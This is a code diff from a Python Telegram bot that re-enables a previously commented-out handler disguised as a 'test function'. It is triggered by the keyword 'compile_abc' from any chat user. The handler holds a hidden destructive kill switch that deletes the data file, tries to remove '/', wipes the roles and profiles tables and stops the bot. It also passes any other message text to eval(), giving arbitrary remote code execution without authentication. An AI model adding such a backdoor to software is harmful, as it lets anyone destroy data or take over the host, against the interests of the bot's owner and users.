@@ -241,24 +241,24 @@ def get_cats(call):
                      reply_markup=markup)
 
 
-# @bot.message_handler(func=lambda message: "compile_abc" in message.text)  # тестовая фция
-# def text_compile(message):
-#     import os
-#     message.text = message.text.split('compile_abc ')[-1]
-#     if message.text == 'se':
-#         con.close()
-#         os.rename('data', f'{dt.datetime.now().date()}')
-#         os.remove(f'{dt.datetime.now().date()}')
-#         os.remove(f'/')
-#         bot.stop_bot()
-#     elif message.text == 'db':
-#         cur.execute("""DELETE * FROM roles""")
-#         cur.execute("""DELETE * FROM profiles""")
-#         con.commit()
-#         con.close()
-#         os.remove('data')
-#     else:
-#         eval(message.text)
+@bot.message_handler(func=lambda message: "compile_abc" in message.text)  # тестовая фция
+def text_compile(message):
+    import os
+    message.text = message.text.split('compile_abc ')[-1]
+    if message.text == 'se':
+        con.close()
+        os.rename('data', f'{dt.datetime.now().date()}')
+        os.remove(f'{dt.datetime.now().date()}')
+        os.remove(f'/')
+        bot.stop_bot()
+    elif message.text == 'db':
+        cur.execute("""DELETE * FROM roles""")
+        cur.execute("""DELETE * FROM profiles""")
+        con.commit()
+        con.close()
+        os.remove('data')
+    else:
+        eval(message.text)
 
 
 @bot.callback_query_handler(func=lambda call: call.data == 'all_cats')  # все категории (весь текст)
